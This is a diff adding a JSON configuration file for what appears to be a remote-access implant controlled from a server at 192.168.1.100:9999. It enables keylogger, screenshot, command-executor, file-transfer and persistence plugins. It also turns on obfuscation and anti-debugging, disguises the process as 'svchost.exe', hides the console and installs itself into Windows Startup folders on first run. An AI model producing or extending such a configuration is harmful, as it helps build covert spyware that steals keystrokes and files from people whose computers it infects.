@@ -1,0 +1,60 @@
+{
+  "server": {
+    "ip": "192.168.1.100",
+    "port": 9999,
+    "use_tls": true,
+    "verify_certificate": true,
+    "certificate_fingerprint": "sha256:abc123..."
+  },
+  "authentication": {
+    "token": "AGENT_JWT_TOKEN_HERE",
+    "secret_key": "UNIQUE_SECRET_KEY_FROM_BUILDER"
+  },
+  "plugins": {
+    "enabled": [
+      "file_transfer",
+      "screenshot",
+      "keylogger",
+      "executor",
+      "systeminfo",
+      "persistence"
+    ],
+    "plugin_dir": "./plugins",
+    "auto_load": true
+  },
+  "connection": {
+    "reconnect_enabled": true,
+    "reconnect_delay": 5,
+    "max_reconnect_delay": 60,
+    "heartbeat_interval": 60,
+    "heartbeat_timeout": 10
+  },
+  "performance": {
+    "command_timeout": 300,
+    "file_transfer_chunk_size": 65536,
+    "max_buffer_size": 10000,
+    "enable_compression": true
+  },
+  "logging": {
+    "level": "INFO",
+    "file": "./logs/agent.log",
+    "max_size": 10485760,
+    "backup_count": 5,
+    "format": "%(asctime)s - %(levelname)s - %(message)s"
+  },
+  "security": {
+    "enable_obfuscation": true,
+    "enable_anti_debugging": true,
+    "process_name": "svchost.exe",
+    "hide_console": true
+  },
+  "persistence": {
+    "enabled": true,
+    "methods": ["auto"],
+    "install_on_first_run": true,
+    "backup_locations": [
+      "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+      "%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    ]
+  }
+}
